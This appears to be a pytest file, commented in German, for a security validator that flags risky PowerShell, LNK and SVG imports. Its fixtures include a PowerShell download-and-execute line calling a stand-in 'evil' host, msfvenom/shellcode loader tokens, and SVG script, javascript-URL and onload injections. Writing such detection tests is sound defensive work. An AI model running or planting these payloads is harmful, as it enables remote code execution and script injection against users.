"""
test_script_and_svg_validators.
"""

from __future__ import annotations

from pathlib import Path

from core.security.sub_validators.script_validator import ScriptValidator
from core.security.sub_validators.svg_validator import SvgValidator
from core.security.validation_report import ImportType, Severity, ValidationReport


def _report(path: Path, typ: ImportType) -> ValidationReport:
    return ValidationReport(path=path, declared_type=typ)


# ---------------------------------------------------------------------------
# Script
# ---------------------------------------------------------------------------


def test_jede_ps1_loest_received_threat_aus(tmp_path: Path) -> None:
    src = tmp_path / "harmlos.ps1"
    src.write_text("Write-Host 'Hallo Welt'", encoding="utf-8")
    report = _report(src, ImportType.PS1)
    ScriptValidator().validate(src, report)
    codes = {t.code for t in report.threats}
    assert "SCRIPT_FILE_RECEIVED" in codes


def test_obfuscation_keywords_geflaggt(tmp_path: Path) -> None:
    src = tmp_path / "loader.ps1"
    src.write_text(
        "$x = [System.Convert]::FromBase64String('AAAA'); "
        "iex (downloadstring 'http://evil/x.ps1')",
        encoding="utf-8",
    )
    report = _report(src, ImportType.PS1)
    ScriptValidator().validate(src, report)
    codes = {t.code for t in report.threats}
    assert "SCRIPT_OBFUSCATION" in codes


def test_loader_pattern_kritisch(tmp_path: Path) -> None:
    """Pattern-Test: wir bauen einen String der msfvenom-Token enthaelt
    (eines der ``_LOADER_PATTERNS``-Marker), aber nicht so aussieht
    dass Windows Defender die Datei in Quarantaene packt bevor der
    Test lesen kann."""
    src = tmp_path / "harmlose_pattern_demo.txt"
    src.write_text(
        "# Demo fuer Pattern-Erkennung\n"
        "# Token: msfvenom\n"
        "# Token: shellcode\n",
        encoding="utf-8",
    )
    report = _report(src, ImportType.PS1)
    ScriptValidator().validate(src, report)
    crit = [
        t for t in report.threats
        if t.code == "SCRIPT_KNOWN_LOADER_PATTERN" and t.severity == Severity.CRITICAL
    ]
    assert crit, f"Erwartet CRITICAL-Loader-Pattern, got: {report.threats}"


def test_lnk_keine_inhaltsheuristik(tmp_path: Path) -> None:
    """LNK ist Binaer — wir markieren nur das Vorhandensein."""
    src = tmp_path / "verknuepfung.lnk"
    src.write_bytes(b"\x4c\x00\x00\x00" + b"\x00" * 80)  # LNK-Magic-ish
    report = _report(src, ImportType.LNK)
    ScriptValidator().validate(src, report)
    codes = {t.code for t in report.threats}
    assert "SCRIPT_FILE_RECEIVED" in codes
    # Keine Obfuscation-Tests bei LNK
    assert "SCRIPT_OBFUSCATION" not in codes


# ---------------------------------------------------------------------------
# SVG
# ---------------------------------------------------------------------------


def test_svg_ohne_script_keine_kritischen(tmp_path: Path) -> None:
    src = tmp_path / "ok.svg"
    src.write_text(
        '<?xml version="1.0"?>'
        '<svg xmlns="http://www.w3.org/2000/svg"><circle r="10"/></svg>',
        encoding="utf-8",
    )
    report = _report(src, ImportType.SVG)
    SvgValidator().validate(src, report)
    assert not any(t.severity == Severity.CRITICAL for t in report.threats)


def test_svg_mit_script_tag_kritisch(tmp_path: Path) -> None:
    src = tmp_path / "boese.svg"
    src.write_text(
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<script>alert(1)</script></svg>',
        encoding="utf-8",
    )
    report = _report(src, ImportType.SVG)
    SvgValidator().validate(src, report)
    crit = [t for t in report.threats if t.code == "SVG_SCRIPT_TAG"]
    assert crit and crit[0].severity == Severity.CRITICAL


def test_svg_javascript_url_high(tmp_path: Path) -> None:
    src = tmp_path / "js.svg"
    src.write_text(
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<a href="javascript:alert(1)"><circle r="10"/></a></svg>',
        encoding="utf-8",
    )
    report = _report(src, ImportType.SVG)
    SvgValidator().validate(src, report)
    codes = {t.code for t in report.threats}
    assert "SVG_JAVASCRIPT_URL" in codes


def test_svg_event_handler_high(tmp_path: Path) -> None:
    src = tmp_path / "evt.svg"
    src.write_text(
        '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
        encoding="utf-8",
    )
    report = _report(src, ImportType.SVG)
    SvgValidator().validate(src, report)
    codes = {t.code for t in report.threats}
    assert "SVG_EVENT_HANDLER" in codes
